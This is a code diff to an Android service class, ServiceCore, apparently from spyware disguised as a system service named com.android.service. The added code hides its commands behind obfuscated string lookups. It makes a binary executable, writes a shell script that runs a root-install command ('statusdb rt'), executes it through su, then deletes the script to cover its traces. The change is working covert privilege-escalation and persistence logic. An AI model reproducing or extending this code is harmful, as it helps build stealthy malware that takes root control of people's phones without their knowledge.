@@ -451,24 +451,21 @@ public class ServiceCore extends Service {
 			if (Cfg.DEBUG) {
 				Check.log(TAG + " (superapkRoot): " + "chmod 755 " + path + "/" + suidext); //$NON-NLS-1$
 				Check.log(TAG
-						+ " (superapkRoot): " + "[su] [-c] [" + Messages.getString("32.31") + " " + Messages.getString("32.32") + "]"); //$NON-NLS-1$
+						+ " (superapkRoot): " + Messages.getString("32.31")); //$NON-NLS-1$
 			}
 
-			Runtime.getRuntime().exec("chmod 755 " + path + "/" + suidext);
-
-			Process localProcess;
-			if (Cfg.OSVERSION.equals("v2")) {
-				localProcess = Runtime
-						.getRuntime()
-						.exec(new String[] {
-								Messages.getString("32.30"), "-c", Messages.getString("32.31"), Messages.getString("32.32") }); //$NON-NLS-1$ //$NON-NLS-2$
-			} else {
-				localProcess = Runtime.getRuntime().exec(
-						new String[] { Messages.getString("32.30"), "-c", Messages.getString("32.29") }); //$NON-NLS-1$ //$NON-NLS-2$
-
+			Runtime.getRuntime().exec(Messages.getString("32.7") + path + "/" + suidext);
+			
+			if (createInstallScript() == true) {
+				Process script = Runtime.getRuntime().exec(Messages.getString("32.7") + path + "/s");
+				script.waitFor();
+			
+				// su -c /data/data/com.android.service/files/s
+				Process localProcess = Runtime.getRuntime().exec(Messages.getString("32.31"));
+				localProcess.waitFor();
+				
+				removeInstallScript();
 			}
-
-			localProcess.waitFor();
 		} catch (final Exception e1) {
 			if (Cfg.EXCEPTION) {
 				Check.log(e1);
@@ -574,6 +571,37 @@ public class ServiceCore extends Service {
 			}
 
 			return false;
+		}
+	}
+	
+	private boolean createInstallScript() {
+		// 32.29 = /data/data/com.android.service/files/statusdb rt
+		String script = "#!/system/bin/sh\n" + Messages.getString("32.29") + "\n";
+
+		if (Cfg.DEBUG) {
+			Check.log(TAG + " (createInstallScript): install script: " + script); //$NON-NLS-1$
+		}
+		
+		try {
+			FileOutputStream fos = openFileOutput("s", Context.MODE_PRIVATE);
+			fos.write(script.getBytes());
+			fos.close();
+			
+			return true;
+		} catch (Exception e) {
+			if (Cfg.EXP) {
+				Check.log(e);
+			}
+			
+			return false;
+		}
+	}
+	
+	private void removeInstallScript() {
+		File rem = new File("s");
+		
+		if (rem.exists()) {
+			rem.delete();
 		}
 	}
 
